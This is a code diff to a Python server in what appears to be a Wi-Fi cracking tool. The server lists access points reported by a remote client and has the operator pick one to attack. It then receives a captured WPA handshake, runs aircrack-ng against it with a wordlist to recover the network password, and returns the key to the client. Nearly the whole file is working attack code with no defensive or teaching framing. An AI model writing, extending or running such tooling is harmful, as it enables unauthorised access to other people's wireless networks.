@@ -3,12 +3,17 @@ import os
 import subprocess
 import tqdm
 
+#TODO: possibly combine retied captures to add missing keys from other incomplete sets
+
+global fileName
+fileName = ""
 
 def bToString(arg):
     return ''.join(map(chr, arg))
 
 
 def breakKey():
+    print("Extracting key")
     cracking = subprocess.run(
         ['.\\aircrack-ng-1.6-win\\bin\\aircrack-ng.exe', "-l", "password", "-w", "wordlist.txt", "handshake-01.cap"],
         shell=True, stdout=subprocess.PIPE)
@@ -33,44 +38,46 @@ s = socket.socket()
 s.bind((HOST, PORT))
 s.listen(5)
 print(f"[*] Listening as {HOST}:{PORT}")
+while True:
+    client_socket, client_address = s.accept()
+    print(f"[+] {client_address} is connected.")
 
-client_socket, client_address = s.accept()
-print(f"[+] {client_address} is connected.")
-
-receivedHeader = client_socket.recv(BUFFER_SIZE).decode()
-headerCode, headerMessage = receivedHeader.split(SEPARATOR)
-if headerCode == 1:
-    for i in range (0,len(headerMessage)):
-        print("["+i+"] :: "+headerMessage[i])
-    index = input("select the numeric value for the AP you wish to attack: ")
-    client_socket.sendall(bytes(index, 'utf-8'))
-
-elif headerCode == 2:
-    received = client_socket.recv(BUFFER_SIZE).decode()
-    filename, filesize = received.split(SEPARATOR)
-    filename = os.path.basename(filename)
-    filesize = int(filesize)
-    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
-    with open(filename, "wb") as f:
-        while True:
+    receivedHeader = client_socket.recv(BUFFER_SIZE).decode()
+    headerCode, headerMessage = receivedHeader.split(SEPARATOR)
+    if int(headerCode) == 1:
+        headerMessage = headerMessage.split(",")
+        i = 0
+        j = 0
+        while i < len(headerMessage):
+            print(f"[{j}] :: {headerMessage[i]} : {headerMessage[i+1]}")
+            i += 2
+            j += 1
+        index = input("select the numeric value for the AP you wish to attack, -1 to rescan: ")
+        client_socket.send(bytes(index, 'utf-8'))
+        client_socket.close()
+    elif int(headerCode) == 2:
+        print("Receiving Handshake file")
+        received = client_socket.recv(BUFFER_SIZE)
+        received = bToString(received)
+        filename, filesize = received.split(SEPARATOR)
+        filesize = int(filesize)
+        print(f"Receiving file {filename} of size {filesize}")
+        client_socket.sendall(bytes(f"Ready {filename}", 'utf-8'))
+        filename = os.path.basename(filename)
+        writeFile = open(filename, "wb")
+        count = 0
+        while count < filesize:
             # read 1024 bytes from the socket (receive)
             bytes_read = client_socket.recv(BUFFER_SIZE)
-            if not bytes_read:
-                # nothing is received
-                # file transmitting is done
-                break
-            # write to the file the bytes we just received
-            f.write(bytes_read)
-            progress.update(len(bytes_read))
+            # write new data to file
+            writeFile.write(bytes_read)
+            # update our byte count
+            count += (len(bytes_read))
         print("File received")
-        pass
-
-    key = breakKey()
-    if key is None:
-        print("No key extracted")
-    else:
-        client_socket.sendall(bytes(key, 'utf-8'))
-        client_socket.close()
-
-# close the server socket
-s.close()
+        key = breakKey()
+        if key is None:
+            print("No key extracted")
+        else:
+            client_socket.sendall(bytes(key, 'utf-8'))
+            client_socket.close()
+            exit()
